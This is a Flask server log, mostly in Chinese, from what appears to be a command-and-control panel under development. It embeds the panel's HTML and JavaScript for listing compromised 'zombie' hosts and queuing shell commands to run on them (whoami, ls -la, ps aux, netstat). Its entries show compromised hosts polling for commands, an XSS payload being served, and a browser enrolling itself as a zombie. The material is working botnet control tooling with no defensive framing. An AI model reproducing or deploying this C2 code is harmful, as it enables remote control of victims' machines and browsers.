ease;\n    }\n\n    .test-btn:hover {\n        transform: translateY(-2px);\n        box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);\n    }\n\n    .test-result {\n        margin-top: 20px;\n        padding: 15px;\n        border-radius: 8px;\n        min-height: 20px;\n    }\n\n    .test-result.success {\n        background: linear-gradient(135deg, #d4edda, #c3e6cb);\n        color: #155724;\n        border: 1px solid #c3e6cb;\n    }\n\n    .test-result.error {\n        background: linear-gradient(135deg, #f8d7da, #f5c6cb);\n        color: #721c24;\n        border: 1px solid #f5c6cb;\n    }\n\n    .back-btn {\n        display: inline-block;\n        background: linear-gradient(135deg, #667eea, #764ba2);\n        color: white;\n        padding: 15px 30px;\n        border-radius: 10px;\n        text-decoration: none;\n        font-weight: bold;\n        transition: all 0.3s ease;\n        box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);\n    }\n\n    .back-btn:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);\n        text-decoration: none;\n        color: white;\n    }\n\n    @media (max-width: 768px) {\n        .test-form {\n            grid-template-columns: 1fr;\n            gap: 10px;\n        }\n\n        .endpoint-header {\n            flex-direction: column;\n            align-items: flex-start;\n            gap: 10px;\n        }\n    }\n</style>\n\n<script>\n    function copyPayload(button) {\n        const text = button.getAttribute(\'data-payload\');\n        navigator.clipboard.writeText(text).then(function () {\n            // 顯示複製成功提示\n            const originalText = button.textContent;\n            button.textContent = \'✅ 已複製\';\n            button.style.background = \'#28a745\';\n\n            setTimeout(() => {\n                button.textContent = originalText;\n                button.style.background = \'#28a745\';\n            }, 2000);\n        }).catch(function (err) {\n            console.error(\'複製失敗: \', err);\n            alert(\'複製失敗，請手動複製\');\n        });\n    }\n\n    function testGetRequest() {\n        const message = document.getElementById(\'testMessage\').value;\n        const ip = document.getElementById(\'testIP\').value;\n        const resultDiv = document.getElementById(\'testResult\');\n\n        if (!message) {\n            resultDiv.className = \'test-result error\';\n            resultDiv.textContent = \'請輸入測試消息\';\n            return;\n        }\n\n        // 使用相對路徑（因為在同一個域名下）\n        const url = `/api/control/add_message?message=${encodeURIComponent(message)}&target_ip=${encodeURIComponent(ip)}`;\n\n        resultDiv.textContent = \'發送中...\';\n        resultDiv.className = \'test-result\';\n\n        fetch(url)\n            .then(response => response.json())\n            .then(data => {\n                if (data.status === \'success\') {\n                    resultDiv.className = \'test-result success\';\n                    resultDiv.innerHTML = `\n                    <strong>✅ 測試成功!</strong><br>\n                    消息: ${data.data.message}<br>\n                    目標IP: ${data.data.target_ip || \'未指定\'}<br>\n                    時間: ${data.data.timestamp}<br>\n                    <small>完整URL: ${window.location.origin}${url}</small>\n                `;\n                } else {\n                    resultDiv.className = \'test-result error\';\n                    resultDiv.textContent = `❌ 錯誤: ${data.error}`;\n                }\n            })\n            .catch(error => {\n                resultDiv.className = \'test-result error\';\n                resultDiv.textContent = `❌ 請求失敗: ${error.message}`;\n            });\n    }\n</script>\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 21:29:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:29:31] "GET /api/control/help HTTP/1.1" 200 -
2025-06-24 21:29:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:29:31] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 21:29:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:29:31] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 21:30:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:30:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:30:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:30:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:30:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:30:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:30:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:30:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:30:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:30:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:31:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:31:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:31:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:31:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:31:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:31:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:31:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:31:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:31:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:31:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:31:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 21:31:42 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 21:31:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 21:31:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:31:42] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 21:31:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 21:31:52 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 21:31:52 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 192.168.1.100,消息: 測試殭屍機器連接,時間: 2025-06-24 21:31:52.318879
2025-06-24 21:31:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0057s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 21:31:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:31:52] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 21:32:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 21:32:00 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 21:32:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 80 bytes [200 OK]>
2025-06-24 21:32:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:32:00] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 21:32:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 21:32:17 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 21:32:17 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 10.0.0.5,消息: XSS攻擊載荷,時間: 2025-06-24 21:32:17.633875
2025-06-24 21:32:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0050s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 21:32:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:32:17] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 21:32:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 21:32:17 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 21:32:17 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 172.16.1.20,消息: 殭屍機器上線,時間: 2025-06-24 21:32:17.643774
2025-06-24 21:32:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0032s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 21:32:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:32:17] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 21:32:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:32:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:32:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:32:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:32:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:32:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:32:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:32:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:32:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:32:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:32:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 21:32:28 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 21:32:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 115 bytes [200 OK]>
2025-06-24 21:32:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:32:28] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 21:32:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 21:32:44 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 21:32:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0006s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 192.168.1.100</p>\n            <p><strong>目標配置:</strong> 測試殭屍機器連接</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:31:52.314166</p>\n        </div>\n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 10.0.0.5</p>\n            <p><strong>目標配置:</strong> XSS攻擊載荷</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:32:17.629657</p>\n        </div>\n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 172.16.1.20</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:32:17.641227</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 21:32:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:32:44] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-24 21:32:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:32:44] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-24 21:32:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:32:44] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 21:33:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 21:33:00 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 21:33:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 115 bytes [200 OK]>
2025-06-24 21:33:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:33:00] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 21:33:22 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 21:33:22 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 21:33:22 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 21:33:22 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 21:33:22 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 21:33:22 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 21:33:22 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 21:33:22 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 21:33:22 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 21:33:26 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 21:33:26 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 21:33:26 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 21:33:26 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 21:33:26 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 21:33:26 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 21:33:26 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 21:33:26 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 21:33:26 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 21:33:26 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 21:33:26 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 21:33:26 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 21:33:26 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 21:33:26 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 21:33:26 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 21:33:26 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 21:33:26 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 21:34:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:34:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:34:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0191s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:34:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:34:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:34:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:34:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:34:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:34:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:34:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:35:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:35:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:35:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:35:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:35:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:35:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:35:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:35:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:35:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:35:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:35:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:35:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:39] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:35:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:35:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:35:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:35:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:39] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:35:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 21:35:40 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 21:35:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 4094 bytes [200 OK]>
2025-06-24 21:35:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:40] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 21:35:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 21:35:42 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 21:35:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 21:35:42 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 21:35:42 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36,時間: 2025-06-24 21:35:42.678836
2025-06-24 21:35:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0052s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 21:35:42 | WARNING  | file.py:272 | set() | Exception raised while handling cache file '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/d0caf455478196b036867a09f819e42c'
Traceback (most recent call last):
  File "/home/hacker/Desktop/share/C2/venv/lib/python3.12/site-packages/cachelib/file.py", line 260, in set
    fd, tmp = tempfile.mkstemp(
              ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 496, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 395, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
